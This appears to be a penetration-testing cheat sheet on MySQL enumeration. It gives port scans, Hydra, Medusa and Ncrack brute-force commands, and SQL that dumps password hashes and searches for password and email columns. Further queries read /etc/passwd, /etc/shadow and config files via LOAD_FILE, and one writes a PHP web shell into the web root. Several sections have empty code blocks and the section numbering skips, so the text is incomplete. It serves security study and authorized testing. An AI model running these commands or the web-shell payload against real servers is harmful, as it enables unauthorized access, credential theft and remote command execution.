# 📘 MySQL Enumeration

MySQL enumeration is the process of gathering information about a MySQL service running on a target system. This includes identifying the server version, user accounts, privileges, databases, tables, configuration, and potential security misconfigurations.

---

# 🟢 1. Default Port

MySQL typically listens on:

```text
3306
```

---

# 🟢 2. Port Scanning

## 🟩 Basic Service Detection

```bash
nmap -v -sT -sV -p 3306 <target-ip>
```

## 🟩 Detect Version & Service Information

```bash
nmap -v -sT -sV --script=mysql-info -p 3306 <target-ip>
```

## 🟩 Run All MySQL NSE Scripts

```bash
nmap -v -sT -sV --script=mysql* -p 3306 <target-ip>
```

## 🟩 Fast Network Scan (Masscan)

```bash
masscan -p3306 192.168.29.0/24 --rate 1000
```

---

# 🟢 3. Brute Force Authentication

## 🟩 Hydra

```bash
hydra -L users.txt -P passwords.txt mysql://<target-ip>
```

### Example

```bash
hydra -L /opt/username.txt -P /opt/password.txt mysql://192.168.29.70
```

---

## 🟩 Medusa

```bash
medusa -h <target-ip> -u root -P passwords.txt -M mysql
```

---

## 🟩 Ncrack

```bash
ncrack -p 3306 --user root -P passwords.txt <target-ip>
```

# 🟢 6. User & Privilege Enumeration

## 🟩 List Users

```sql
SELECT user, host
FROM mysql.user;
```

---

## 🟩 User Password Hashes

```sql
SELECT user, authentication_string
FROM mysql.user;
```

---

## 🟩 Check Anonymous Users

```sql
SELECT user, host
FROM mysql.user
WHERE user='';
```

---

## 🟩 Check Remote Root Access

```sql
SELECT user, host
FROM mysql.user
WHERE user='root';
```

---

## 🟩 Authentication Plugins

```sql
SELECT user, host, plugin
FROM mysql.user;
```

---

## 🟩 Show User Privileges

```sql
SHOW GRANTS;
```

---

## 🟩 Show Grants for Specific User

```sql
SHOW GRANTS FOR 'root'@'localhost';
```

# 🟢 8. Searching for Sensitive Information

## 🟩 Find User Tables

```sql
SELECT table_schema, table_name
FROM information_schema.tables
WHERE table_name LIKE '%user%';
```

---

## 🟩 Find Password Columns

```sql
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%pass%';
```

---

## 🟩 Find Email Columns

```sql
SELECT table_schema, table_name, column_name
FROM information_schema.columns
WHERE column_name LIKE '%mail%';
```

---

## 🟩 Find Token/API Columns

```sql

```

---

## 🟩 Find Admin Tables



---

## 🟩 Check Empty Passwords


---

## 🟩 Brute Force Login

```bash

```

---

## 🟩 Full Enumeration

```bash
nmap -p3306 \
--script=mysql-enum,mysql-users,mysql-databases,mysql-empty-password,mysql-brute \
<target-ip>
```

# 🟢 10. Reading Files via SQL

> Requires the **FILE** privilege.

## 🟩 Read `/etc/passwd`

```sql
SELECT LOAD_FILE('/etc/passwd');
```

---

## 🟩 Read MySQL Configuration

```sql
SELECT LOAD_FILE('/etc/mysql/my.cnf');
```

---

## 🟩 Read Shadow File

```sql
SELECT LOAD_FILE('/etc/shadow');
```

---

## 🟩 Read Backup File

```sql
SELECT LOAD_FILE('/var/backups/mysql_backup.sql');
```

---

## 🟩 Read Web Configuration

```sql
SELECT LOAD_FILE('/var/www/html/config.php');
```

---

# 🟢 11. Writing Files via SQL

## 🟩 Check `secure_file_priv`

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

---

## 🟩 Write Data to File

```sql
SELECT 'test'
INTO OUTFILE '/tmp/test.txt';
```

---

## 🟩 Write PHP Web Shell

```sql
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';
```

### Requirements

- FILE privilege enabled
- Writable destination directory
- Web server access (for web shell)

# 🟢 15. Common Misconfigurations

- Empty passwords
- Weak passwords
- Remote root login enabled
- Anonymous users
- Default credentials
- Outdated MySQL version
- Excessive FILE privileges
- Weak database permissions
- World-readable configuration files
- Exposed SQL backup files
